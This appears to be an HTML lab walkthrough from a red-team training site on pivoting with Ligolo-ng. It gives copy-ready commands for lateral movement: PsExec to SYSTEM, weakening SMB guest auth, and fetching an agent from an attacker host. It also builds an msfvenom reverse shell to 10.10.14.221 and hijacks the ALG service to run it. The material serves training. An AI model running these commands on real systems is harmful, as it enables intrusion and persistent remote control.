@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ligolo-NG: Mastering Advanced Network Pivoting | Red Nexus Academy</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f9fafb; /* gray-50 */
+        }
+        .code-font {
+            font-family: 'JetBrains Mono', monospace;
+        }
+        /* Base terminal prompt style - The Red Nexus Standard */
+        .terminal-prompt::before {
+            content: 'PS C:\\> ';
+            color: #10b981; /* emerald-500 */
+            margin-right: 0.5rem;
+            user-select: none;
+        }
+        /* Logic for custom prompts via data attribute */
+        .terminal-prompt[data-prompt]::before {
+            content: attr(data-prompt);
+        }
+        /* Allow prompt color to be overridden */
+        .terminal-prompt.text-yellow-400::before {
+            color: #fbbf24; 
+        }
+
+        .terminal-output {
+            white-space: pre-wrap;
+            color: #e5e7eb; /* gray-200 */
+            padding-top: 8px;
+            border-top: 1px solid #334155; /* slate-700 */
+            margin-top: 8px;
+        }
+        .bg-console {
+            background-color: #1e293b; /* slate-800 */
+        }
+        /* Custom styling for the visual steps section */
+        .visual-step {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            padding: 1rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 0.75rem;
+            background-color: #ffffff;
+            box-shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+        }
+        .visual-step img {
+            width: 100%;
+            height: auto;
+            border-radius: 0.5rem;
+            border: 1px solid #d1d5db;
+        }
+        .step-list {
+            list-style: none;
+            counter-reset: step-counter;
+        }
+        .step-list > li {
+            counter-increment: step-counter;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: flex-start;
+        }
+        .step-list > li::before {
+            content: counter(step-counter);
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            width: 2rem;
+            height: 2rem;
+            min-width: 2rem;
+            border-radius: 9999px;
+            background-color: #f59e0b; /* amber-500 */
+            color: white;
+            font-weight: bold;
+            margin-right: 1rem;
+        }
+        
+        /* Copy Button Styling */
+        .code-block-wrapper {
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #e5e7eb;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 0.375rem;
+            padding: 0.25rem 0.5rem;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            opacity: 0;
+        }
+        .code-block-wrapper:hover .copy-btn {
+            opacity: 1;
+        }
+        .copy-btn:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+        .copy-btn.copied {
+            background-color: #10b981;
+            color: white;
+            border-color: #10b981;
+        }
+        
+        /* Google Translate Customization */
+        .goog-te-gadget {
+            font-family: 'Inter', sans-serif !important;
+            font-size: 0px !important; /* Hide text */
+        }
+        .goog-te-gadget .goog-te-combo {
+            margin: 0 !important;
+            padding: 0.5rem !important;
+            border-radius: 0.375rem !important;
+            border: 1px solid #e5e7eb !important;
+            font-size: 0.875rem !important;
+            color: #374151 !important;
+            background-color: white !important;
+            cursor: pointer;
+            outline: none;
+        }
+        .goog-te-gadget span {
+            display: none !important; /* Hide 'Powered by Google' */
+        }
+        /* Hide the top banner frame */
+        .goog-te-banner-frame {
+            display: none !important;
+        }
+        body {
+            top: 0 !important;
+        }
+    </style>
+</head>
+<body class="text-gray-700 relative">
+
+    <!-- Scroll to Top Button -->
+    <button id="scrollToTopBtn" class="fixed bottom-8 right-8 bg-cyan-700 text-white p-3 rounded-full shadow-lg opacity-0 transition-opacity duration-300 hover:bg-cyan-800 focus:outline-none z-50 pointer-events-none">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <header class="bg-white/95 backdrop-blur-md sticky top-0 z-50 shadow-lg border-b border-cyan-700/30">
+        <nav class="container mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center">
+                    <a href="https://www.rednexus.academy" class="flex items-center">
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALwAAACUCAMAAAAeaLPCAAABHVBMVEUAAAD///+8JXTaIEneIT7mHjq8JG3NIlfrHi/BI2kAAwDqHzTGI2YYGBjDImfjHzvcH0bUIE/VIFPKI1vKIl+4uLj29vbg4ODHI2J4EzbHx8cPDw+MjIx5eXm9JXrq6uo6OjpSUlIlJSUwMDCnp6dfX19HR0eVlZUiBgsADQbS0tJnZ2dwcHAeHh6Dg4O7Hzr5HCpCDyS4HkC1IF1QDBCLEye5GjHKHjH6HzrQIT+sHUBqFysPAgJNFi8xDBx6EBzLJHtpGBmGFjKWGiSzIk/oHFeqFiZXFic7CxLQGys+ER1BDw+SHUCQJl9jIUSeFy1YDS6rLFd1HkkcChSnJWeFG0aVG1EtCQ3zGkZyFSZfDRxqGTuxFB2fHUBAFy/FmrmiAAAIc0lEQVR4nO2aa1fbRhCGV8ZX2eKSIInoUt21riUZUhoujUNIS0NIS0tSQgpp8/9/RmdWkm3ZSz/0yBx6zr4nEFky+NFoNPPOCkKEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhGrWZHGHvLRDXtr1WDWZkCqs/H+A/3aG+PhhCYMcfv/i4LDV7/ePWq1Ws9k83v3hZSWTJs/n9erVCdvr5gpM9koxCxFTKfQQ9K8v9vb2ut1uvw/sGwC/ubm29sM8/cvt7cFg0Ou1G6jT0zajlQqpjFItRJWxUSj0Vg7/JkdfgN/6cY7+2fbOem+9127n9N/k8I6kaRrSR/DKLU9l5IflpqSvHP4gR1+AX9u6K9Ne5sObI82w7VCH0CO8JmlGGIaqZVqapIeh4QB9sGr4n/a6nMivrXWG07cswjdwp6JJI4CjkqThS4C3Md1N4huSlpDABvqV583wiJc2EPqzacXhw0NaxAxeLeDT4u2qJMGmO8oTapWS5Tf8yG/9/Kx8z33wmkc8iG8GOQRpoyczeJsQT5e0lcOTyds89IvwW0/OS/ide+BjkgK86pHIkRzP9H2/gLdIhqcwXjG9PCHvLvb6XPiz9/8OL4U0hHqjxmQMWYOFMpzC+/BdVZP7P7gWePi6u+BH/smHk3+HZzIgbWIr39aoW8CTMcAH2Wrhme6Oun0e/JNfJ3h2i/Blk9JUAwJvsF+hFaU9LuETTaIPgA56sQfsHPjOSzx6H7zj4W0pAS/GWacg2y/glVDS3IdAh+AeHPHhO++xSfHgoUlBcQwMVs1tTXLM8tflkY/htFac8rkm8i+HPPhOp3M2XI78Nf5MXiqxmgM83LAzL5DD4zVJ7/3EWiXftY5aG5zIdyDtF+BPL2fwwRTeWYDHyK/emeXw5EWrz4XvPFuC/43BawgPqY05vxj5MbReuIUfhh0Sh/x+1OfAP+2cvb+a77DtRpu5niLykPOUwUsOSs3hdVaHtAeCB8kHRxvLOQ/0Hz5V7EH7I5nBY+TTHD4v+oTMLPEDlUqCU/jnJueG7Tx9ur0zGMzBX/7BJnZF17GoW7qD1Wak5zI8Yjn55sh6MHbwCfKb5n3w++vr673e6Wmjcf1xUgy4mZJBdWQueDb6+cp0++HQmSYvmlz47cGvXz7d3FxfX19++bq0TvJY9Hm3xYfffy6fgIaPlhx1fsxNm53BzR+LbzUti0K2e5TisBfYhTySUtxvRpT6JFVVqJqRajC7SQ24E1boNK+amzz49cGnxZWcLK8tNDcBVllhQpLC/gCHWj3AymMw4wMtLHPK5YbVoAPf7Z9AvwQP9FcL70VLrPlIjfBAqWGJcaDEUF1TA/ANRoy71bKFpdDVRgb0Xb3uEWUW1l1ezu8Mevsn1dgzP5+U8DYyxSDIIRgNR4Gq6zTDoyNwxzBn+Wje4FpkYCTqn68m39/e3p5/Ju+OOfCDQW9wg95+xq/kSTKDH5ULHRGeCB5j5yH5RDFwaQHg4USIIem1Wh5cRn1zeLgBdfJw9+7umA/fu2EuogKvIzwGMoFttziC46suOXhOaC0DYgL8GDy0pDG3qVsmB+I/wxPyFmYpcMSti+bGGj/y0GG/zP8Q2gNwLwAfejiHY7stNC6MQgkP0QarhsmDMTezOvsXJMNBt5ikWq3jjYUbdhvtAfiDXnv/VRXecKR0zLwNxHoUJ0niskNo8vNVHJvdqnAKToA3rKQZKvXqHWzl193u3BjY3N3iR759c1KBD3VJzeHHeuHL8nSGIsMGK3O+2qD1X4FfG14swJ9z4Xvtxk0FnqrSyMrnJXvmKmEOwchHi/DQz0JVdaT5BKtBr7sL8JPbLW7k242P02cmGHlbcvK1PexVDi5rs6jaZSuqwmeUWi6UoXpL5U/dyqJTc3dIfkT4zjJ84zcyg1cD6Eys2owdaElB4LOFGt+AwYTFt5o2VNLCgNRd599Wl/sQ/vMZH759/ZVM4Z04Yrni4g07a/oeXJMwT+3UYPaAwRd1vmZ4mQNP3nX4kT+9HE7hoY8y+KAKDymUBpD+kVmJ/GrgyV8V+M1NhCfnHV7O4yTFVtFY2pgs8oZZhXc1SBmdXRG0Bxmr8Bkrm8qq4fPIE/LsZz48zLAlfJbh7GrnM3eIgrZqG+gMLOYXsEmp49Ap7IGmWmHNN6zMhzf/5sM32iztGTz2zqJJTWs4dCTYEzMb5uNxNpx7xHWK7ZFbIzw/8jJ533nChc9XzMDPGz7mN3r1KbzBQg4NKjPypScjXz3GYdzLu5Re6zrahA8/Ic9x4WMZvnF6g+fGJm8Yw3EOL4fuzDezTCmezCo+KTamH2XWP5bz0wbXtrmRB13hkxyXQWalRZy3LG5uj02/POjWDl1I/qv6TKr5XQk//Pse+EvoOZbtQchJ4pkm9KbAjXySBUQxffhGPSXAq5J6puIqJCAWnEiGF6Pup5vyWy486uSM2coleMgbl9pppKRkbFskiTzbS6I4TVI7GkfEDWM4aHvK2EqCJPXGCnWjyPatJK19BLwXHm5aSHqwxJWFVtArhE8T6o6JHYc+tagbUJpQm9puaBPf8oA48SHytmeFiUcMK7XCmHrUrhm+sAc5PcL/PrfOcfW0g4YePGWv1yhK5SU6Y9dK7ITGxHZpMrbDOEiBz4xS4lNXGbuWZ0VmZru2GlA7ImFipUFgmX5Y5xSFen3B5pD+IYyBh4fNrZeVSfvq04cP+0zXN5cfr74Wn24mnkKgrQaQ1JFHIEcyJU6DzLRjYgYkTswM8xzy3g3gn+lHqen7aa12mEn+diYcsuXpyhj/j4TKw+aqnxL/B03mFznk/Iv9J+MfQQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJPT79A7TyH2m3jfVvAAAAAElFTkSuQmCC" alt="RedNexus" class="h-10 w-auto mr-3 rounded-md">
+                    </a>
+                    <a href="https://blog.rednexus.academy" class="text-cyan-700 border border-cyan-700 hover:bg-cyan-50 transition duration-150 ease-in-out px-4 py-2 rounded-md font-bold text-sm">
+                        Blogs
+                    </a>
+                </div>
+                
+                <div class="hidden md:flex md:items-center md:space-x-4">
+                    <a href="https://rednexus.academy/certificates" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Certificates</a>
+                    <a href="https://rednexus.academy/courses" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Courses</a>
+                    <a href="https://hossamshady.medium.com/" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Medium</a>
+                    <a href="https://rednexus.academy/faq" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">FAQ</a>
+                    <a href="https://rednexus.academy/events" class="text-gray-600 hover:text-cyan-700 px-3 py-2 rounded-md font-bold text-sm">Events</a>
+
+                    <a href="mailto:support@rednexus.academy" class="text-cyan-700 border border-cyan-700 hover:bg-cyan-50 transition duration-150 ease-in-out px-4 py-2 rounded-md font-bold text-sm ml-2">
+                        Contact Us
+                    </a>
+                    <div id="google_translate_element" class="ml-2"></div>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-10 md:py-16">
+
+        <!-- LECTURE HEADER -->
+        <section id="intro-header" class="mb-16">
+            <div class="bg-white p-8 rounded-xl shadow-2xl border border-gray-300 text-center">
+                <img src="https://blog.rednexus.academy/resources/ligolo1.png" alt="Ligolo-NG Diagram" class="mx-auto w-full max-w-3xl h-auto rounded-lg mb-8 shadow-md border border-gray-200" onerror="this.onerror=null;this.src='https://placehold.co/800x400/e2e8f0/475569?text=Ligolo+Diagram+Unavailable'">
+                <h1 class="text-4xl font-extrabold text-cyan-700 mb-0">Ligolo-NG: Mastering Advanced Network Pivoting</h1>
+                <p class="text-gray-500 mt-2">Persistence & Privilege Escalation | Module 2</p>
+            </div>
+        </section>
+
+        <!-- SECTION 1: Initial Access -->
+        <section id="initial-access" class="mb-16 pt-10 -mt-10">
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">1. Initial Access & Preparation</h2>
+            
+            <!-- Network Config Note -->
+            <div class="bg-gray-100 p-4 rounded-lg border-l-4 border-gray-600 mb-6">
+                <p class="font-semibold text-gray-800">Network Configuration:</p>
+                <ul class="list-none text-gray-700 text-sm mt-2 space-y-1">
+                    <li><span class="font-bold">Attacker (Kali):</span> <b class="text-red-500">10.10.14.221</b></li>
+                    <li><span class="font-bold">Victim 1 (SRV01):</span> 10.10.111.111</li>
+                    <li><span class="font-bold">Victim 2 (SRV02 - Internal):</span> <b class="text-blue-500">172.20.0.52</b></li>
+                    <li><span class="font-bold">Internal Network:</span> 172.20.0.0/24</li>
+                </ul>
+            </div>
+
+            <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-blue-600 mb-6">
+                <p class="font-semibold text-blue-700">Credential Discovery:</p>
+                <p class="text-gray-700 text-sm">
+                    Before proceeding with the attack, students have obtained valid RDP credentials for the Windows machine (<b>SRV01</b>):
+                    <br>
+                    <span class="font-bold">Username:</span> helen<br>
+                    <span class="font-bold">Password:</span> RedRiot88
+                </p>
+            </div>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300 mb-8">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Connecting to the Target</h3>
+                <p class="text-gray-600 mb-4">
+                    First, establish a remote desktop connection to <b>SRV01</b> using the discovered credentials. We use <code>xfreerdp</code> with the following flags: 
+                    <br><code>/v</code> specifies the target server, <code>/u</code> and <code>/p</code> are the username and password, and <code>/dynamic-resolution</code> adjusts the RDP window to your screen size.
+                </p>
+                
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution</div>
+                </div>
+            </div>
+
+            <p class="text-gray-600 mb-6">
+                Students will reuse the previously spawned target and RDP session(s). To begin, exit any existing sessions and establish a new <b>PsExec</b> session with <b>SYSTEM</b> privileges.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Elevating Access to SYSTEM</h3>
+                <p class="text-sm text-gray-600 mb-2">
+                    We use <b>PsExec</b> to execute processes on the remote machine. The <code>-i</code> flag runs the program interactively, <code>-s</code> runs it as the SYSTEM account (highest privilege), and <code>-u/-p</code> provides valid credentials to authenticate.
+                </p>
+                <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="PS C:\Users\helen> ">cd C:\Tools\SysInternalsSuite</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="PS C:\Tools\SysInternalsSuite> ">.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd</div>
+                    <pre class="terminal-output text-sm text-green-200">PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Registry Modification</h3>
+                <p class="text-gray-600 mb-4">
+                    Within the PsExec session on SRV02, we modify the registry to allow guest access in <b>SMB2</b> and <b>SMB3</b>. This command sets <code>AllowInsecureGuestAuth</code> to <code>1</code> (enabled), which is often required to access shared folders without strict authentication headers during pivoting.
+                </p>
+                <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="C:\Windows\system32> ">reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f</div>
+                    <pre class="terminal-output text-sm text-green-200">The operation completed successfully.</pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Discover Target IP</h3>
+                <p class="text-gray-600 mb-4">
+                    Subsequently, open <b>PowerShell</b> and ping <b>SRV02</b> to uncover the IP address assigned to that machine. This confirms DNS resolution and connectivity to the internal target.
+                </p>
+                <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="PS C:\Users\helen> ">ping SRV02</div>
+                    <pre class="terminal-output text-sm text-green-200">Pinging SRV02.inlanefreight.local [<b class="text-blue-500">172.20.0.52</b>] with 32 bytes of data:
+Reply from <b class="text-blue-500">172.20.0.52</b>: bytes=32 time=1ms TTL=128
+...</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 2: Network Pivoting -->
+        <section id="pivoting" class="mb-16 pt-10 -mt-10">
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">2. Network Pivoting with Ligolo-ng</h2>
+            <p class="text-gray-600 mb-6">
+                Students will discover that <b>SRV02</b> is part of an internal network, requiring dynamic port-forwarding using <b>ligolo-ng</b>.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Setting up Ligolo-ng</h3>
+
+                <p class="text-gray-600 mb-4">Download the respective versions for <b>Linux</b> (proxy) and <b>Windows</b> (agent) from the GitHub releases using <code>wget</code>.</p>
+
+                <!-- Linux Download -->
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip; wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz</div>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Extract the archives using <code>unzip</code> for the Windows zip file and <code>tar</code> for the Linux gzip file. We then make the proxy executable with <code>chmod +x</code>.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">unzip ligolo-ng_agent_0.6.2_windows_amd64.zip</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">chmod +x proxy</div>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Transfer & Execution</h3>
+                <p class="text-gray-600 mb-4">Start a <b>Python HTTP server</b> on port 8000. This allows the victim machine to download files from our attacker machine.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">python3 -m http.server</div>
+                    <pre class="terminal-output text-sm text-green-200">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Download the executable on the target machine (<b>SRV02</b>) via <b>PowerShell</b> using `iwr` (Invoke-WebRequest). We target our attacker IP on port 8000.</p>
+                <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="PS C:\Users\helen> ">iwr -uri http://<b class="text-red-500">10.10.14.221</b>:8000/agent.exe -o agent.exe</div>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Start <b>Ligolo's proxy</b> on the <b>attacker machine</b> using <code>-selfcert</code> to automatically generate self-signed TLS certificates for the connection.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">./proxy -selfcert</div>
+                    <pre class="terminal-output text-sm text-green-200">INFO[0000] Listening on 0.0.0.0:11601</pre>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Establish the connection from the target machine back to our proxy. We use <code>-ignore-cert</code> because we are using self-signed certificates.</p>
+                <div class="bg-slate-900 p-3 rounded-lg code-font mt-2 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="PS C:\Users\helen> ">.\agent.exe -connect <b class="text-red-500">10.10.14.221:11601</b> -ignore-cert</div>
+                    <pre class="terminal-output text-sm text-green-200">time="2024-07-11T03:49:21-05:00" level=info msg="Connection established"</pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Interface Configuration</h3>
+                <p class="text-gray-600 mb-4">Configure the network <b>interface</b> on the <b>attacker machine</b>. This creates a virtual TUN interface named <code>ligolo</code> and adds a route to the internal <code>172.20.0.0/24</code> network through that interface.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">whoami</div>
+                    <pre class="terminal-output text-sm text-red-500">student</pre>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">sudo ip tuntap add user <b class="text-red-500">student</b> mode tun ligolo</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">sudo ip link set ligolo up</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">sudo ip route add <b class="text-red-500">172.20.0.0/24</b> dev ligolo</div>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Finally, select the session in the <b>Ligolo proxy</b> console and type <code>start</code> to activate the tunnel.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="ligolo-ng » ">session</div>
+                    <div class="text-green-400 terminal-prompt" data-prompt="[Agent : INLANEFREIGHT\helen@SRV01] » ">start</div>
+                    <pre class="terminal-output text-sm text-green-200">INFO[6744] Starting tunnel to INLANEFREIGHT\helen@SRV0</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 3: Service Abuse -->
+        <section id="service-abuse" class="mb-16 pt-10 -mt-10">
+            <h2 class="text-3xl font-bold text-cyan-700 mb-6">3. Service Abuse & Flag Capture</h2>
+            <p class="text-gray-600 mb-6">
+                With the network tunnel established, we will now exploit the <b>Application Layer Gateway Service (ALG)</b> to gain persistent access.
+            </p>
+
+            <div class="bg-white p-6 rounded-xl shadow-2xl border border-gray-300">
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mb-4">Payload Generation</h3>
+                <p class="text-gray-600 mb-4">Generate a <b>Windows reverse shell</b> using <b>msfvenom</b>. We use <code>-p</code> for payload selection, <code>LHOST/LPORT</code> for our listener details, and <code>-f exe-service</code> to create an executable compatible with Windows Services.</p>
+                
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<b class="text-red-500">10.10.14.221</b> LPORT=9001 -f exe-service -o service-shell.exe</div>
+                    <pre class="terminal-output text-sm text-green-200">Saved as: service-shell.exe</pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Hosting the Payload (SMB)</h3>
+                <p class="text-gray-600 mb-4">Initiate an <b>SMB server</b> using <b>Impacket</b>. This creates a share named <code>share</code> in the current directory, allowing the target machine to download <code>service-shell.exe</code> via the network path <code>\\10.10.14.221\share</code>.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">sudo impacket-smbserver share ./ -smb2support</div>
+                    <pre class="terminal-output text-sm text-green-200">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] Config file parsed...</pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Configuring ALG Service</h3>
+                <p class="text-gray-600 mb-4">
+                    We use <b>impacket-services</b> to remotely modify the <b>ALG</b> service configuration. Specifically, we change the <code>binPath</code> to point to our malicious executable hosted on the SMB share. When the service starts, it will execute our shell instead of the legitimate binary.
+                </p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">impacket-services INLANEFREIGHT/helen:'RedRiot88'@<b class="text-blue-500">172.20.0.52</b> change -name ALG -path "\\\\<b class="text-red-500">10.10.14.221</b>\\share\\service-shell.exe"</div>
+                    <pre class="terminal-output text-sm text-green-200">[*] Changing service config for ALG</pre>
+                </div>
+
+                <h3 class="text-xl font-bold text-gray-800 border-b pb-3 mt-8 mb-4">Execution & Flag</h3>
+                <p class="text-gray-600 mb-4">Start a <b>listener</b> on port 9001 using Netcat (`nc`) to catch the incoming reverse shell connection.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">nc -nvlp 9001</div>
+                    <pre class="terminal-output text-sm text-green-200">listening on [any] 9001 ...</pre>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Trigger the execution by starting the <b>ALG</b> service via Impacket. This forces the target to run our malicious binary.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="student@rednexus:~$ ">impacket-services INLANEFREIGHT/helen:'RedRiot88'@<b class="text-blue-500">172.20.0.52</b> start -name ALG</div>
+                </div>
+
+                <p class="text-gray-600 mb-4 mt-6">Return to your <b>Netcat</b> listener. You should see a connection. Use the <code>type</code> command to read the content of the flag file.</p>
+                <div class="bg-slate-900 p-4 rounded-lg code-font mb-4 code-block-wrapper">
+                    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    <div class="text-green-400 terminal-prompt" data-prompt="C:\Windows\system32> ">type C:\Flags\serviceflag.txt</div>
+                    <pre class="terminal-output text-sm text-green-200">rednexus{FLAG_CONTENT_HERE}</pre>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="bg-slate-900 border-t border-slate-700 mt-16 text-white py-12">
+        <div class="container mx-auto px-4 flex flex-col items-center">
+            <h3 class="text-xl font-semibold mb-4 tracking-wide text-white">Our Partners</h3>
+            <div class="w-full max-w-5xl">
+                <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 items-center justify-items-center gap-8 mb-8">
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="AISEC">
+                        <img alt="AISEC" class="mx-auto object-contain min-h-[96px] sm:min-h-[110px] md:min-h-[128px] max-h-[120px] sm:max-h-[140px] md:max-h-[160px] max-w-[180px] sm:max-w-[200px] md:max-w-[220px] w-auto" src="https://rednexus.academy/assets/aisec-CPMZqhQs.png" onerror="this.onerror=null;this.src='https://placehold.co/200x120/white/black?text=AISEC'">
+                    </a>
+                    <a href="#" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center p-2 transition-transform duration-200 hover:scale-105 hover:opacity-95" aria-label="GDG">
